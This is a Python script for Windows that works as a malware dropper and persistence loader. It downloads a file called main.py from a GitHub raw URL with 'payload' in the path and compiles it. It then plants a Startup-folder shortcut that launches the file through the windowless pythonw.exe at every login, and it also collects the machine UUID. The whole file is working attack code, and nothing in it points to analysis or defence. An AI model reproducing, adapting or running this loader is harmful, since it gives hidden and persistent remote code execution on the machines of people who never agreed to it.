import os
import sys
import urllib.request
import subprocess
import py_compile
from win32com.client import Dispatch

def compile_script(source_path, compiled_path):
    """Compile the Python script into a .pyc file."""
    try:
        py_compile.compile(source_path, cfile=compiled_path)
        print(f"Compiled script to: {compiled_path}")
    except Exception as e:
        print(f"Failed to compile script: {e}")
        sys.exit(1)

def download_script(url, file_path):
    """Download the script from the URL and save it to the specified file path."""
    try:
        with urllib.request.urlopen(url) as response:
            content = response.read()
        with open(file_path, "wb") as file:
            file.write(content)
        print(f"Downloaded script to: {file_path}")
    except Exception as e:
        print(f"Failed to download script: {e}")
        sys.exit(1)

def add_to_startup():
    # Define paths
    uuid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    path = os.path.join(startup_folder, "test.lnk")
    target = sys.executable.replace("python.exe", "pythonw.exe")
    wDir = os.path.join(os.environ["LOCALAPPDATA"], "gd")
    script_path = os.path.join(wDir, "main.py")
    icon = sys.executable

    # Ensure the working directory exists
    if not os.path.exists(wDir):
        os.makedirs(wDir)
        print(f"Created directory: {wDir}")

    # Download the script from the given URL
    script_url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/payload/main.py"
    download_script(script_url, script_path)
    compile_script(os.path.join(wDir, "main.py"), os.path.join(wDir, "main.pyc"))

    # Create a shortcut in the startup folder
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = wDir
    shortcut.IconLocation = icon
    shortcut.Arguments = f'"{script_path}c"'
    shortcut.save()

add_to_startup()
print(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
